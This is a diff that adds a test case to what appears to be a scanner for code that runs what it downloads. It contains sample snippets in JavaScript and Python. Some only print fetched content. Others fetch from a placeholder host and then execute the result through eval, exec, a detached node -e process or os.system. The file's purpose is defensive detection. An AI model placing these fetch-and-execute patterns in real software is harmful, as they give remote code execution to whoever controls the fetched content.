@@ -74,6 +74,28 @@ test("received code is found on its line, in both tests", () => {
   }
 });
 
+test("a program written in a string is text; one that runs what it fetches is read as code", () => {
+  // (0.1.8) the network call a string literal's text names is the literal's own code: xmlhttprequest's
+  // program for `node -e` was "runs code it receives over the network" (core._dl_in_code)
+  const text = [
+    "var execString = \"var http = require('http'), https = require('https'), fs = require('fs');\"\n  + \"var req = doRequest(options, function(response) {\"\n  + \"response.on('data', function(chunk) { responseText += chunk; });\"\n  + \"response.on('end', function() { fs.writeFileSync('\" + contentFile + \"', responseText); });\"\n  + \"});\";\nvar syncProc = spawn(process.argv[0], [\"-e\", execString]);\n",   // xmlhttprequest's program for node -e
+    "import subprocess, sys\ncode = \"import urllib.request as u; print(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n",   // printed, in Python
+    "execSync(\"node -e \\\"require('https').get('https://files.invalid/p', r => r.pipe(process.stdout))\\\"\");\n",   // in a command line's text
+    "import os\ncmd = f\"python -c \\\"import urllib.request as u; print(u.urlopen('{url}').read())\\\"\"\nos.system(cmd)\n",   // in an f-string's text
+  ];
+  for (const t of text) {
+    assert.equal(runsReceivedCode(t), null, t.slice(0, 60));
+    assert.deepEqual(importTimeRisk(t), [[], null]);
+  }
+  const code = [
+    ["const s = \"require('https').get('https://files.invalid/p', r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)); })\";\nspawn(process.execPath, ['-e', s], { detached: true });\n", 1],   // the program runs what it fetches
+    ["import subprocess, sys\ncode = \"import urllib.request as u; exec(u.urlopen('https://files.invalid/p').read())\"\nsubprocess.run([sys.executable, '-c', code])\n", 2],   // in Python
+    ["const code = `${await (await fetch(u)).text()}`;\neval(code);\n", 2],   // a template literal's interpolation
+    ["import os, requests\nos.system(f\"python -c \\\"{requests.get(u).text}\\\"\")\n", 2],   // an f-string's interpolation
+  ];
+  for (const [t, line] of code) assert.equal(runsReceivedCode(t), line, t.slice(0, 60));
+});
+
 const DESERIAL_REASON = "deserializes data it receives over the network";
 const IMPORT_REASON = "loads a module named by data it receives over the network";
 const DROP_REASON = "downloads a file and then runs it";
